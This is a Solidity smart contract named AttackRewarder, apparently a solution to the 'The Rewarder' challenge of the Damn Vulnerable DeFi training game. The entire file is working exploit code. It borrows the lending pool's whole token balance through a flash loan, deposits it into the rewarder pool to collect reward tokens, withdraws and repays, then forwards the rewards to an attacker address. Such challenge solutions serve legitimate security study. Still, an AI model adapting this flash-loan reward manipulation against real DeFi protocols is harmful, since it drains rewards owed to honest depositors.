// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILoanerPool {
  function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
  function deposit(uint256 amountToDeposit) external;
  function withdraw(uint256 amountToWithdraw) external;
}

interface IDamnValuableToken {
  function transfer(address to, uint256 amount) external returns (bool);
  function balanceOf(address account) external returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool); 
}

interface IAccountingToken {
  function balanceOf(address account) external returns (uint256);
}

interface IRewardToken {
  function transfer(address to, uint256 amount) external returns (bool);
  function balanceOf(address account) external returns (uint256);
}
/**
 * @title AttackRewarder
 */
contract AttackRewarder {

    ILoanerPool flashLoanerPool;
    IRewarderPool rewarderPool;
    IDamnValuableToken token;
    IAccountingToken accToken;
    IRewardToken rewardToken;

    uint256 private amount;

    constructor(address _loaner, address _rewarder, address _accounting, address _reward, address _token) {
        flashLoanerPool = ILoanerPool(_loaner);
        rewarderPool = IRewarderPool(_rewarder);
        token = IDamnValuableToken(_token);
        accToken = IAccountingToken(_accounting);
        rewardToken = IRewardToken(_reward);

        amount = token.balanceOf(address(flashLoanerPool));
    }

    function run(address _attacker) public {

      flashLoanerPool.flashLoan(amount);

      bool result = rewardToken.transfer(_attacker, rewardToken.balanceOf(address(this)));
      require(result, "Rewards not sent to the attacker");
    }

    function receiveFlashLoan(uint256) external {
      require(token.balanceOf(address(flashLoanerPool)) == 0, "Pool should not have any DVT");
      require(token.balanceOf(address(this)) == 1000000 ether, "Not enough DVT tokens");
      require(rewardToken.balanceOf(address(this)) == 0, "We should not have any RWT token");
      require(accToken.balanceOf(address(this)) == 0, "We should not have any rTKN token");

      // approve the rewarder pool
      token.approve(address(rewarderPool), amount);   
      
      // deposit the DVT tokens, receive rTKN (accounting) and RWT (reward) tokens
      rewarderPool.deposit(amount);
      
      require(token.balanceOf(address(this)) == 0, "We haven't deposited all the DVT token");
      require(rewardToken.balanceOf(address(this)) > 0, "We should have received the reward");
      require(accToken.balanceOf(address(this)) == 1000000 ether, "Not enough rTKN tokens");

      // get the DVT tokens back
      rewarderPool.withdraw(amount);

      require(token.balanceOf(address(this)) == 1000000 ether, "Not enough DVT tokens to pay back the loan");
      require(accToken.balanceOf(address(this)) == 0, "We should have withdrawn all the rTNK tokens");
      
      // send back the DVT tokens to the pool
      token.transfer(address(flashLoanerPool), amount);

      require(token.balanceOf(address(this)) == 0, "We haven't paid the loan back");


    }

    receive() external payable {}

}